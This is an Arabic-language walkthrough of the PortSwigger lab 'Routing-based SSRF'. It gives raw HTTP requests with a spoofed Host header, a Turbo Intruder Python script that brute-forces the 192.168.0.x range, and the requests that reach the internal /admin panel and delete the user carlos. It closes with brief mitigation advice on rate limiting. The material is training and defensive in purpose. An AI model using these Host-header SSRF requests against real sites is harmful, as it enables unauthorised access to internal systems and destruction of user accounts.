# [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

## **`الهدف`**
قم بالوصول إلى لوحة الإدارة الداخلية الموجودة في نطاق `192.168.0.0/24` ثم قم بحذف حسابي `carlos`.
## **`خطوات الحل`**
==**`ملاحظة:`**== خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder` بالإضافة إلى أنه يستعل أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`، ولكن يمكن حله بدونها تمامًا.

سنقوم بالدخول إلى اللاب وتحويل الطلب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a5600db03a4c23583c10abf008d00e3.web-security-academy.net
Cookie: session=2dxvfUaNPgruWR6Jp92dnS1hsrykzDD3; _lab=46%7cMCwCFBobPtSNKn7xJPJRKW36MGVtAJ2QAhQLMhd6mMereWbktETgObr6d%2be8GKgeL80vfWFGOEX1zCE5bysIgdmP4XQVx7TKBFvP2Ekz%2faCClyqOq1PWacflYZmxBYTC4QHbScAAA2kNWLX7syL%2fVpsWkIZieda99KCM5XrSdVWhlk8%3d
```
وبعد ذلك سنقوم بتغير الـ `Host` إلى `192.168.0./%s`
```http
GET / HTTP/2
Host: 192.168.0.%s
Cookie: session=2dxvfUaNPgruWR6Jp92dnS1hsrykzDD3; _lab=46%7cMCwCFBobPtSNKn7xJPJRKW36MGVtAJ2QAhQLMhd6mMereWbktETgObr6d%2be8GKgeL80vfWFGOEX1zCE5bysIgdmP4XQVx7TKBFvP2Ekz%2faCClyqOq1PWacflYZmxBYTC4QHbScAAA2kNWLX7syL%2fVpsWkIZieda99KCM5XrSdVWhlk8%3d
```
ونقوم بتحويله إلى `Turbo Intruder` ونستعمل سكريبت `Python` التالي لتخمين جميع الـ `IPs` من `192.168.0.0 إلي 192.168.0.255`
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3, 
                           requestsPerConnection=20,
                           pipeline=False,    
                           engine=Engine.THREADED
                           )
    for i in range(256):
        code = '{:01d}'.format(i)
        engine.queue(target.req, code)

def handleResponse(req, interesting):
    table.add(req)
```
وسنجد إحدي الطلبات تكون استجابتها `Status Code 302` وبعد ذلك نعود إلى الطلب ونقوم بتعديل الـ `Host` إلى الـ `IP` الناجح والمسار إلى `/admin`
```http
GET /admin HTTP/2
Host: 192.168.0.253
Cookie: session=2dxvfUaNPgruWR6Jp92dnS1hsrykzDD3; _lab=46%7cMCwCFBobPtSNKn7xJPJRKW36MGVtAJ2QAhQLMhd6mMereWbktETgObr6d%2be8GKgeL80vfWFGOEX1zCE5bysIgdmP4XQVx7TKBFvP2Ekz%2faCClyqOq1PWacflYZmxBYTC4QHbScAAA2kNWLX7syL%2fVpsWkIZieda99KCM5XrSdVWhlk8%3d

csrf=bgijxMIzct5ttW7Y6fW6tY0vfNshzzZZ&username=carlos
```
وبعد ذلك نقوم بإرسال الطلب ثم نقوم بالضغط على `Mouse left-click` داخل الـ `request` ثم `Open response in browser` ثم نقوم بنسخ الرابط وفتحه في المتصفح، وسنجد حقل فارغ نقوم بكتابة اسم `Carlos` به ونضغط زر `Delete User` ولكن قبلها نقوم بتشغيل الـ `Intercept` لنقوم بتعديل الريكويست وإضافة الـ `192.168.0.253`
```http
POST /admin/delete HTTP/2
Host: 192.168.0.253
Cookie: session=2dxvfUaNPgruWR6Jp92dnS1hsrykzDD3; _lab=46%7cMCwCFBobPtSNKn7xJPJRKW36MGVtAJ2QAhQLMhd6mMereWbktETgObr6d%2be8GKgeL80vfWFGOEX1zCE5bysIgdmP4XQVx7TKBFvP2Ekz%2faCClyqOq1PWacflYZmxBYTC4QHbScAAA2kNWLX7syL%2fVpsWkIZieda99KCM5XrSdVWhlk8%3d

csrf=bgijxMIzct5ttW7Y6fW6tY0vfNshzzZZ&username=carlos
```

ونمرر الطلب لننتهي من حل الاب.

كما يمكن أن نجعل `csrf و username` كمعلمات في الرابط في الطلب وسينجح.
```http
POST /admin/delete?csrf=bgijxMIzct5ttW7Y6fW6tY0vfNshzzZZ&username=carlos HTTP/2
Host: 192.168.0.253
Cookie: session=2dxvfUaNPgruWR6Jp92dnS1hsrykzDD3; _lab=46%7cMCwCFBobPtSNKn7xJPJRKW36MGVtAJ2QAhQLMhd6mMereWbktETgObr6d%2be8GKgeL80vfWFGOEX1zCE5bysIgdmP4XQVx7TKBFvP2Ekz%2faCClyqOq1PWacflYZmxBYTC4QHbScAAA2kNWLX7syL%2fVpsWkIZieda99KCM5XrSdVWhlk8%3d
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Host header authentication bypass](./Host-header-authentication-bypass.md)

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting`.
